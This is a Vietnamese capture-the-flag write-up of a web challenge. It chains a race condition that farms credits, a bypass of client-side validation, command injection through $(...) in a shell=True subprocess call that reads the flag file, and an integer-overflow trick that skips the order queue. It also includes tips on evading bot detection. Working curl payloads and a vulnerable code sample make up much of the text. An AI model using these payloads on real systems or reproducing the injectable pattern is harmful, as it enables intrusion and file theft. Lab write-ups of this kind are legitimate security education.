# defcamp-supply

## Overview
> Đây là bài dễ nhất của mảng web exploit với whitebox cho sẵn và target rất rõ ràng
## Target 
> Command Injection chiếm flag qua hàm kiểm tra lỏng lẻo
```
def main() -> int:
    profile = sys.argv[1] if len(sys.argv) > 1 else ""
    if profile.lower() in ALLOWED:
        print(f"profile accepted:{profile}")
        return 0

    print(f"profile rejected:{profile}")
    return 1
```

## Solution

### Reconnaissance
Khi vào server với endpoint / mặc định, server sẽ tạo ra một cookie ngẫu nhiên, chuỗi này hoàn toàn là một userID ngẫu nhiên, chỉ dùng để đối chiếu với thông tin trong Database của server, có thể loại trừ hướng khai thác.
```
HTTP/1.1 200 OK
Server: gunicorn
Date: Sun, 20 Sep 2026 05:34:58 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 10055
Vary: Cookie
Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJzdGFydGVkX2F0IjoxNzg5ODgyNDk4LCJ1c2VyX2lkIjoiMTBiMTcxMTdkZmFiNDU3MzkyM2IxOTdhOGI2NDJkMzcifQ.aq9wgg.fX2EOvlgNdPEjobuPyjgWiJhLbc; Expires=Sun, 20 Sep 2026 06:04:58 GMT; HttpOnly; Path=/
```
Khi dùng lệnh /redeem, server sẽ +2 credits cho mỗi cookie
```
POST /redeem HTTP/1.1
Host: 34.179.250.187:32707
Content-Length: 0
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://34.179.250.187:32707
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.179.250.187:32707/
Accept-Encoding: gzip, deflate, br
Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJzdGFydGVkX2F0IjoxNzg5ODgyNDk4LCJ1c2VyX2lkIjoiMTBiMTcxMTdkZmFiNDU3MzkyM2IxOTdhOGI2NDJkMzcifQ.aq9wgg.fX2EOvlgNdPEjobuPyjgWiJhLbc
Connection: keep-alive

```
```
HTTP/1.1 200 OK
Server: gunicorn
Date: Sun, 20 Sep 2026 05:35:05 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 10047
Vary: Cookie

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>DEFCAMP // Supply Drop</title>
    <link rel="stylesheet" href="/static/style.css">
  </head>
  <body>
    <main class="shell">
      <section class="topbar">
        <div>
          <p class="eyebrow">DEFCAMP // AUTHORIZED SUPPLY NODE</p>
          <h1>Build your loadout.</h1>
        </div>
        <div class="balance">
          <span>Credits</span>
          <strong>¢2</strong>
```
Nếu loại bỏ giá trị cookie khi POST, server sẽ tự tạo ra một cookie mới và cộng vào đó 2 credits
```
POST /redeem HTTP/1.1
Host: 34.179.250.187:32707
Content-Length: 0
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Origin: http://34.179.250.187:32707
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.179.250.187:32707/
Accept-Encoding: gzip, deflate, br
Cookie: session=
Connection: keep-alive
```
```
HTTP/1.1 302 FOUND
Server: gunicorn
Date: Sun, 20 Sep 2026 05:38:37 GMT
Connection: keep-alive
Content-Type: text/html; charset=utf-8
Content-Length: 189
Location: /
Vary: Cookie
Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlLCJzdGFydGVkX2F0IjoxNzg5ODgyNzE2LCJ1c2VyX2lkIjoiZjM4NGVjNDJhZjBmNGU2YzliNjFmMTk0NjAwMzM1YzYifQ.aq9xXQ.zgE_6i5BVWzzxZ7aVs4D-eyxdNA; Expires=Sun, 20 Sep 2026 06:08:37 GMT; HttpOnly; Path=/

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/">/</a>. If not, click the link.
```

Vậy là server không hề validate cookie, có thể tạo bao nhiêu cookie tùy thích [1]

### Đặt giả thuyết và chiếm credits
Hàm /redeem có thể khai thác bằng cách send requests đồng thời không?

> Thử với các payload sau:
> Payload 1 : Giả mạo user thực tế bằng các header trình duyệt và lấy một session từ server
```
TARGET="http://<TARGETIP>:<TARGETHOST>"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36" # Trình duyệt của tôi
curl -s -c session.txt -H "User-Agent: $UA" "$TARGET/" -o /dev/null
```
> Payload 2: Bắn requests đồng thời để thử
```
for i in $(seq 1 100); do
  curl -s -b session.txt -X POST "$TARGET/redeem" \
    -H "User-Agent: $UA" \
    -H "Accept: text/html,application/xhtml+xml" \
    -H "Referer: $TARGET/" &
done
wait
```

> Payload 3: Kiểm tra số credits đang có trên server
```
curl -s -b session.txt -H "User-Agent: $UA" "$TARGET/" | grep -o '¢[0-9]*' | head -1
```
> Kết quả kiểm tra: 
```
thong7021@Senadina ~ % curl -s -b session.txt -H "User-Agent: $UA" "$TARGET/" | grep -o '¢[0-9]*' | head -1
¢20
```
Vậy là có thể chiếm được credits bằng cách này [2]

> Lưu ý: bắn cùng lúc quá nhiều request thì bị server detect kiểu bot, dính trang "AI Detected" thay vì response thật. Chia nhỏ batch, thêm header giả browser thật (`User-Agent`, `Accept`, `Referer`), và giữ nguyên 1 session (`-b` + `-c`) xuyên suốt thì tỉ lệ lọt cao hơn hẳn. 

### Command Injection

Item `zero_day_debugger` (giá 20 credit) trong `index.html` có field `profile` dạng `<select>` chỉ cho 7 giá trị cố định (`stealth`, `audit`, `sandbox`, `forensics`, `wireless`, `bluetooth`, `firmware`). Đây chỉ là ràng buộc phía client — `/checkout` nhận `profile` thẳng từ POST body, gửi bằng curl thì bypass được luôn, không cần đụng gì tới `<select>` cả.

Soi source `profile_check.py` cho sẵn:
```python
def verify_custom_profile(profile: str) -> str:
    command = f'python3 verify_profile.py "{profile}"'
    completed = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=5,
    )
    return (completed.stdout + completed.stderr).strip()
```
`profile` nhét thẳng vào chuỗi shell (`shell=True`), không escape gì hết. Nằm trong dấu `"..."` nên word-splitting/globbing bị chặn, nhưng **`$(...)` command substitution vẫn expand bình thường dù đứng trong double-quote** — đây chính là kẽ hở để RCE.

Payload dò path flag:
```bash
curl -s -b session.txt -X POST "$TARGET/checkout" \
  -H "User-Agent: $UA" \
  --data-urlencode "item_id=zero_day_debugger" \
  --data-urlencode "quantity=1" \
  --data-urlencode 'profile=$(find / -maxdepth 3 -iname "*flag*" 2>/dev/null)'
```
`verify_profile.py` nhận `profile` là output thật của `find` (đã bị shell expand trước khi tới Python), không match `ALLOWED` nên in `"profile rejected:<output>"` — và chuỗi đó được trả nguyên si trong response của `/checkout` [3]

### Hàng đợi async đứng im, phải soi tiếp field khác

Checkout không trả kết quả ngay, mà queue:
```json
{"balance":8,"cost":20,"eta":1891,"ok":true,"order_id":"b4a18b233215","result":null,"status":"queued"}
```
`eta` ~31 phút, poll lại `/orders/<id>` nhiều lần thì `eta` không hề giảm theo thời gian thực — không có worker chạy nền, order chỉ "done" khi hết hạn tính từ `created_at`.

> Thử thao túng `quantity` — dù đã biết cost premium luôn cố định (không bị bug `quantity≤0→cost=1` như item thường), nhưng đặt câu hỏi: `eta` có tính dựa vào `quantity` không? Bắn thử giá trị âm cực lớn:
```bash
curl -s -b session.txt -X POST "$TARGET/checkout" \
  -H "User-Agent: $UA" \
  --data-urlencode "item_id=zero_day_debugger" \
  --data-urlencode "quantity=-999999" \
  --data-urlencode 'profile=$(find / -maxdepth 3 -iname "*flag*" 2>/dev/null)'
```
Kết quả:
```json
{"balance":12,"cost":20,"eta":-85997924,"ok":true,"order_id":"65e6ccecc53d","result":"profile rejected:/home/ctf/flag.txt\n/proc/kpageflags","status":"done"}
```
`eta` tràn âm khổng lồ — integer overflow trong công thức tính eta dựa theo `quantity` — server coi order quá hạn từ lâu nên xử lý **ngay lập tức** thay vì phải đợi 31 phút, và lộ luôn path flag trong `result`: `/home/ctf/flag.txt` [4]

### Lấy flag
```bash
curl -s -b session.txt -X POST "$TARGET/checkout" \
  -H "User-Agent: $UA" \
  --data-urlencode "item_id=zero_day_debugger" \
  --data-urlencode "quantity=-999999" \
  --data-urlencode 'profile=$(cat /home/ctf/flag.txt 2>&1)'
```
```json
{"balance":24,"cost":20,"eta":-85997819,"ok":true,"order_id":"2189c5aaa25c","result":"profile rejected:CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}","status":"done"}
```

**Flag:** `CTF{00fd1af2af55ba826af4759fc024770d7ae720622e457b570d16224a8f43b5e2}` [5]

## Tổng kết attack chain
> 1. **Race condition** trên `/redeem`: check `daily_claimed` và cộng credit không atomic — bắn nhiều request đồng thời trên cùng 1 session để vượt giới hạn "1 lần/ngày", farm đủ 20 credit.
> 2. **Client-side-only restriction** trên field `profile`: `<select>` chỉ chặn ở HTML/JS, server không validate lại whitelist trước khi đưa vào subprocess.
> 3. **Command Injection**: `profile_check.py` dùng `subprocess.run(..., shell=True)` với f-string không escape → `$(...)` command substitution chạy được dù nằm trong double-quote.
> 4. **Integer Overflow** ở field `eta`: `quantity` âm cực lớn làm phép tính eta tràn số, bypass hàng đợi async, ép order xử lý ngay lập tức.
